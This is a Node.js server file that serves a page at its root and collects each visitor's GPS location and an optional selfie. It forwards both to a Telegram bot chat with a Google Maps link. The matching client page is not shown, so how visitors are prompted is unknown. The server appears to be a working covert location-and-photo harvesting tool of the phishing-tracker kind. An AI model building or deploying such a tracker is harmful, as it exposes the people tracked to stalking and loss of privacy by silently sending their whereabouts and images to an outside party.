const express = require('express');
const http = require('http');
require('dotenv').config();
const socketIo = require('socket.io');
const path = require('path');
const bodyParser = require('body-parser');
const fetch = require('node-fetch'); // Add this line
const FormData = require('form-data');


const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

let currentLocation = null;


async function sendToTelegram(data) {
  const { lat, lng, accuracy, time, selfie } = data;

  const caption = 
    `📍 <b>New Location Received</b>\n` +
    `<b>Latitude:</b> ${lat}\n` +
    `<b>Longitude:</b> ${lng}\n` +
    `<b>Accuracy:</b> ${accuracy} meters\n` +
    `<b>Time:</b> ${new Date(time).toLocaleString()}\n` +
    `<a href="https://www.google.com/maps/search/?api=1&query=${lat},${lng}">Open in Google Maps</a>`;

  try {
    if (selfie && selfie.startsWith('data:image')) {
      const base64Data = selfie.replace(/^data:image\/\w+;base64,/, "");
      const buffer = Buffer.from(base64Data, 'base64');

      const formData = new FormData();
      formData.append('chat_id', TELEGRAM_CHAT_ID);
      formData.append('caption', caption);
      formData.append('parse_mode', 'HTML');
      formData.append('photo', buffer, { filename: 'selfie.jpg', contentType: 'image/jpeg' });

      const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      });

      const json = await res.json();
      if (!json.ok) throw new Error(JSON.stringify(json));
    } else {
      const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: caption,
          parse_mode: 'HTML'
        })
      });

      const json = await res.json();
      if (!json.ok) throw new Error(JSON.stringify(json));
    }

    console.log('Message sent to Telegram successfully.');
  } catch (err) {
    console.error('Error sending message to Telegram:', err.message);
  }
}

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// Homepage to view the live location
// app.get('/', (req, res) => {
//   res.render('dashboard', { location: currentLocation });
// });

// Location sharing page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public/location.html'));
});


// Handle live location from client
io.on('connection', (socket) => {
  socket.on('send-location', (data) => {
    currentLocation = data;
    io.emit('update-location', currentLocation);
    sendToTelegram(currentLocation); // <-- Add this line
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running at http://localhost:${PORT}`));
